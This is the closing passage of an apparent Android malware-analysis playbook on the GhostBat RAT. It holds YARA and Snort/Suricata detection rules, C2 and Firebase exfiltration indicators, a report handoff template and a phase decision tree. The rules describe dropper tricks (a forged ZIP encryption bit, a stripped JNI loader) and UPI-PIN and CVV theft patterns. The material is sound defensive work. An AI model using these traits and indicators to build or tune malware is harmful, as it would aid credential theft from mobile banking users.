        description = "APK central directory with forged encryption bit + dropper shape"
        author = "DroidForensix"
        date = "2026-08-24"
        family = "GhostBat RAT"
        version = "2.1"

    strings:
        $zip_local = { 50 4B 03 04 }
        // CD signature + ANY version bytes + encryption bit set in flags word
        // (v2.1: wildcarded versions - old rule hardcoded 14 03 14 00 and missed variants)
        $forged_cd = { 50 4B 01 02 ?? ?? ?? ?? ?? 01 }
        // generic large-asset dropper name shape (was literal 'assets/EG0x' - trivially renamed)
        $big_asset_regex = /assets\/[A-Za-z0-9_~.-]{3,12}/

    condition:
        uint32(0) == 0x04034b50 and
        $zip_local and $forged_cd and
        for any i in (1..#forged_cd) : (@forged_cd[i] < filesize - 512)
}

rule GhostBat_RAT_Native_Loader {
    meta:
        description = "Stripped ARM64 loader with obfuscated single JNI entry"
        author = "DroidForensix"
        date = "2026-08-24"
        family = "GhostBat RAT"
        version = "2.1"

    strings:
        $elf_arm64 = { 7F 45 4C 46 02 01 01 00 }
        // v2.1: match JNI naming STRUCTURE instead of one literal symbol
        $jni_entry = /Java_[A-Za-z0-9_]{4,40}__{1,2}/ ascii
        $stripped_marker = "libcxxabi" ascii

    condition:
        $elf_arm64 at 0 and $jni_entry and $stripped_marker and
        filesize > 100KB and filesize < 20MB
}

rule GhostBat_RAT_Phishing_Kit {
    meta:
        description = "UPI-PIN phishing kit exfiltrating to Firebase RTDB"
        author = "DroidForensix"
        date = "2026-08-24"
        family = "GhostBat RAT"
        version = "2.1"

    strings:
        // v2.1: structural pattern instead of single project IDs
        $fb_rtdb = /(firebaseio\.com|firebasedatabase\.app)\/clients\// nocase ascii wide
        $pin_exfil = /upipin.{0,4}(cardnumber|cvv)/ nocase ascii wide
        $pii_exfil = /formdata.{0,8}(phone|dob)/ nocase ascii wide

    condition:
        2 of ($fb_rtdb*, $pin_exfil, $pii_exfil) and filesize > 2KB
}
```

## 8.3 — Detection Rules (Snort/Suricata — scoped v2.1)

```
# C2 domains (host-based match - precise)
alert http $HOME_NET any -> any any (msg:"MAFIA GhostBat mining pool C2"; \
  flow:established,to_server; http.host; content:"pool.fjsdalkfa12rs.xyz"; \
  classtype:trojan-activity; sid:1000001; rev:1;)

alert http $HOME_NET any -> any any (msg:"MAFIA GhostBat Firebase UPI-PIN exfil"; \
  flow:established,to_server; http.host; content:"bittu3-default-rtdb"; \
  classtype:credential-theft; sid:1000002; rev:1;)

# v2.1 FIX: alerting on api.telegram.org DNS blocks ALL of Telegram (huge false-positive
# surface). Scope to the specific bot API path instead, at HTTP layer:
alert http $HOME_NET any -> any any (msg:"MAFIA GhostBat Telegram bot C2 getMe"; \
  flow:established,to_server; http.uri; content:"/bot6751695148:"; startswith; \
  classtype:trojan-activity; sid:1000003; rev:1;)

# Forged encryption-bit APKs in transit (wildcarded, mirrors YARA)
alert file_data $HOME_NET any -> any any (msg:"MAFIA APK forged ZIP encryption bit"; \
  file.data; content:"|50 4B 01 02|"; distance:0; within:4; \
  byte_test:1,&,0x01,6,relative; classtype:bad-unknown; sid:1000004; rev:1;)
```

## 8.4 — Final Report Outline

Same structure as v2.0: Executive Summary → Introduction → Phases 1–7 → Detection & Defense → Conclusion → Appendix (IOC CSV, redacted schemas, references with verification dates).

## 8.5 — Handoff Template (FINAL)

```markdown
# ANALYSIS COMPLETE

**Sample**: Rashan Card GhostBat RAT
**Date**: 2026-08-23 · **Analyst**: ____
**Status**: READY FOR PUBLICATION

### Key Findings
1. Family: GhostBat RAT (HIGH confidence, 8/8 techniques + shared bot token)
2. Samples: 1 dropper + 5 embedded payloads
3. Victims: 8,206 profiles, 133 UPI-PINs (gated access, aggregates only)
4. Infrastructure: 3 Firebase, 1 bot, 1 pool, 2 hosts

### Deliverables
- [x] 8-phase report · IOCs · 3 hardened YARA · 4 scoped network rules
- [ ] Abuse reports sent (pending case-officer clearance)
- [ ] Feeds: VT, MalwareBazaar, MISP export

**Legal gate decisions recorded**: Phase 4 [ ], Phase 7 [ ]
```

---

# Appendix A: Using MAFIA as a Handoff Protocol

At any phase break, document:

```markdown
## [PHASE X] HANDOFF

**Phase completed by**: ____ · **Date**: ISO · **Status**: COMPLETE / BLOCKED / INCONCLUSIVE
**Decision**: PROCEED TO X+1 / ARCHIVE / ESCALATE

### What we found
### What we know so far
### Blockers (locked files, missing access, roadblocks)
### For the next analyst (minimal pickup context)
**Next steps**: ___
```

Benefits: parallelization across analysts, knowledge preservation, clear escalation, reproducibility, publication readiness.

# Appendix B: Quick Reference — Phase Decision Tree (fixed v2.1)

```
START: Do you have a binary?
├─ YES → Phase 0 (Triage)
└─ NO → Go get one

Phase 0: Real sample? ── NO → ARCHIVE & exit
Phase 1: Obfuscation?  ── YES → Phase 2 / NO → Phase 3
Phase 2: Extractable?  ── YES → Phase 3 / NO → Document & ESCALATE (dead end → ARCHIVE)
Phase 3: Code understood? ── YES → Phase 4 / NO → Re-decompile or ESCALATE
Phase 4: Legal gate?   ── PASS → dynamic OK / FAIL → passive-only, jump to Phase 5
Phase 5: Infrastructure mapped? ── YES → Phase 6 / NO → ARCHIVE partial findings
Phase 6: Family match? ── YES/MAYBE → Phase 7 (publish as "Unknown" if MAYBE)
Phase 7: Harm quantifiable? ── YES (gated) / NO → Phase 8 anyway
Phase 8: Publish & report ── END
```

---

**MAFIA v2.1 — End of document**
